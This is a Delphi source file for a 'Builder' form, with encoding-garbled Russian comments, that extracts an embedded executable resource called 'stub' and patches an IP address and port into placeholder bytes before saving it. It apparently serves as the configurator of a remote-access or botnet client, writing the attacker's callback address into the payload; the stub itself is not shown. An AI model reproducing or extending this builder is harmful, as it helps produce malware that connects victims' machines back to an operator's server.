unit Builder;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, sEdit, Vcl.ComCtrls,
  sStatusBar, sGroupBox, sDialogs;

type
  TForm4 = class(TForm)
    sGroupBox2: TsGroupBox;
    sStatusBar1: TsStatusBar;
    sEdit1: TsEdit;
    sEdit2: TsEdit;
    sEdit3: TsEdit;
    Button1: TButton;
    sSaveDialog1: TsSaveDialog;
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form4: TForm4;

implementation

{$R *.dfm}

type
  TStringArray = array of string;

function GetAddrFromStringInFile(PathFile, FindStr: string): TStringArray;
var
  b: byte;
  fname: string;
  i, j, g: Integer;
  fs: TFileStream;
  tmpaddr: string;
  Count: Integer;

  function bintoAscii(const bin: array of byte): AnsiString;
  var
    i: integer;
  begin
    SetLength(Result, Length(bin));
    for i := 0 to Length(bin) - 1 do
      Result[1 + i] := AnsiChar(bin[i]);
  end;

begin
  Count := 0;
  fname := PathFile;
  fs := TFileStream.Create(FName, fmOpenRead);
  for i := 0 to fs.Size do
  begin
    fs.Seek(i, soFromBeginning);
    fs.Read(b, 1);
    if bintoAscii(b) = FindStr[1] then
    begin
      tmpaddr := IntToHex(i, 8);
      g := i;
      for j := 2 to Length(FindStr) do
      begin
        Inc(g);
        fs.Seek(g, soFromBeginning);
        fs.Read(b, 1);
        if bintoAscii(b) = FindStr[j] then
        begin
          Continue;
        end
        else
        begin
          tmpaddr := '';
          Break;
        end;
        Application.ProcessMessages;
      end;
      if tmpaddr <> '' then
      begin
        SetLength(result, Count + 1);
        Result[Count] := '$' + tmpaddr;
        Inc(Count);
        tmpaddr := '';
      end;
    end;
    Application.ProcessMessages;
  end;
  fs.free;
end;


procedure ExtractRes(ResType, ResName, ResNewName: string);
var
  Res: TResourceStream;
begin
  Res := TResourceStream.Create(Hinstance, Resname, Pchar(ResType));
  Res.SavetoFile(ResNewName);
  Res.Free;
end;

procedure TForm4.Button1Click(Sender: TObject);
var
Ip, Port:AnsiString;
H, B: Cardinal;
C: array[0..60] of char;
arr: TStringArray;
begin
  if MessageDlg('Are you sure you want to build a build?', mtConfirmation, [mbYes, mbNo], 0, mbYes) = mrYes then
  begin

    if sSaveDialog1.Execute then
    begin
      ExtractRes('EXEFILE', 'stub', sSaveDialog1.FileName + '.exe');
    end;

    Ip := AnsiString(sEdit1.text);
    Port := AnsiString(sEdit2.text);

    arr := GetAddrFromStringInFile(sSaveDialog1.FileName + '.exe', '999999999999999999999999999999999999999999999999999999999999');

    H := CreateFile(PChar(sSaveDialog1.FileName + '.exe'), GENERIC_WRITE, FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); //“ут мы задаЄм откуда будет сохран€тьс€ наш ресурс в нашем случае из dlgSave1

    SetFilePointer(H, StrToInt(arr[0]), nil, FILE_BEGIN); //¬ winhex находим данный байт откуда начало тех самых единичек
    FillChar(C, 60, 0); //выставлено что 60 символов нужно заменить в нашем случае это 50 еденичек
    lstrcat(C, PChar(AnsiString(Ip))); //— данного пол€ мы будем вносить изменени€ в нашь ресурс файл
    WriteFile(H, C, 60, B, nil); //«аписываем


    SetFilePointer(H, StrToInt(arr[1]), nil, FILE_BEGIN); //¬ winhex находим данный байт откуда начало тех самых единичек
    FillChar(C, 60, 0); //выставлено что 60 символов нужно заменить в нашем случае это 50 еденичек
    lstrcat(C, PChar(AnsiString(Port))); //— данного пол€ мы будем вносить изменени€ в нашь ресурс файл
    WriteFile(H, C, 60, B, nil); //«аписываем

    CloseHandle(H); //выходим


    Application.ProcessMessages;


    MessageDlg('+ Done!.', mtInformation, [mbYes], 0);

  end;
end;

procedure TForm4.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
Form4.Close;
end;

end.
